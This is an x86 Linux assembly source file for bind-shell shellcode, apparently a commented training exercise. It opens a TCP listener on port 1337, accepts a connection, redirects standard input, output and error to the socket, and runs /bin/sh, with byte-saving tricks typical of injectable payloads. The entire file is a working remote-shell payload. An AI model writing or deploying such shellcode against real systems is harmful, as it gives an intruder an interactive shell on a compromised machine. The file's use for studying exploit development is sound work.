global _start
section .text

_start:
    ; Socket functions should be accessed through socketcall()
    ; References:
    ;   1. http://man7.org/linux/man-pages/man2/socketcall.2.html
    ;   2. http://lxr.free-electrons.com/source/net/socket.c?v=2.6.35#L2210
    ; Call ids are defined in /usr/include/linux/net.h and should be put in EBX

    ;
    ; socket(PF_INET, SOCK_STREAM, IPPROTO_IP)
    ;
    push byte 0x66      ; socketcall()
    pop eax             ; EAX = 0x66
    cdq                 ; EDX = 0x0 | Saves a byte
    xor ebx, ebx
    inc ebx             ; EBX = 0x1 | #define SYS_SOCKET	1
                        ; saves a byte instead of mov bl, 1
    push edx            ; zeroed out earlier
                        ; protocol = 0
    push ebx            ; SOCK_STREAM = 1
                        ; Needed for bind(), can be used here to save a few bytes
    push byte 0x2       ; PF_INET = 2
    mov ecx, esp        ; ECX points to args
    int 0x80

    xchg esi, eax       ; sockfd is now stored in esi

    ;
    ; bind(sockfd, {sa_family=AF_INET, sin_port=htons(1337), sin_addr=inet_addr("0.0.0.0")}, 16)
    ;
    push edx            ; sockaddr.sin_addr.s_addr: INADDR_ANY = 0
    inc ebx             ; EBX = 0x2 | #define SYS_BIND	2
    push word 0x3905    ; sockaddr.sin_port   : PORT = 1337 (big endian)
    push bx             ; sockaddr.sin_family : AF_INET = 2
    mov ecx, esp        ; ECX holds pointer to struct sockaddr

    push byte 0x10      ; sizeof(sockaddr)
    push ecx            ; pointer to sockaddr
    push esi            ; sockfd
    mov ecx, esp        ; ECX points to args
    push byte 0x66      ; socketcall()
    pop eax
    int 0x80

    ;
    ; listen(sockfd, 2)
    ;
    push ebx            ; queueLimit = 2
    push esi            ; sockfd stored in esi
    mov ecx, esp        ; ECX points to args
    push byte 0x66      ; socketcall()
    pop eax 
    inc ebx
    inc ebx             ; #define SYS_LISTEN	4
    int 0x80
    
    ;
    ; accept(int sockfd, NULL, NULL);
    ; From man 2 accept: When addr is NULL, nothing is filled in; 
    ; in this case, addrlen is not used, and should also be NULL.
    ;
    push edx            ; Push NULL
    push edx            ; Push NULL
    push esi            ; Push sockfd
    mov ecx, esp        ; ECX points to args
    inc ebx             ; #define SYS_ACCEPT	5
    mov al, 0x66        ; socketcall()
    int 0x80
    
    ;
    ; dup2(ebx, {0,1,2})
    ;
    xchg ebx, eax       ; EAX = 0x5, EBX = new_sockfd
    xor ecx, ecx        ; ECX = 0
lbl:
    mov al, 0x3f        ; dup2()
    int 0x80
    inc ecx             ; Iterate over {0,1,2}
    cmp cl, 0x4         ; Are we done?
    jne lbl             ; Nope
    
    ; execve("/bin//sh", NULL, NULL)
    push edx            ; Null terminator
    push 0x68732f2f     ; "hs//"
    push 0x6e69622f     ; "nib/"
    
    mov ebx, esp        ; EBX points to "/bin//sh"
    mov ecx, edx        ; ECX = NULL
    
    mov al, 0xb         ; execve()
    int 0x80
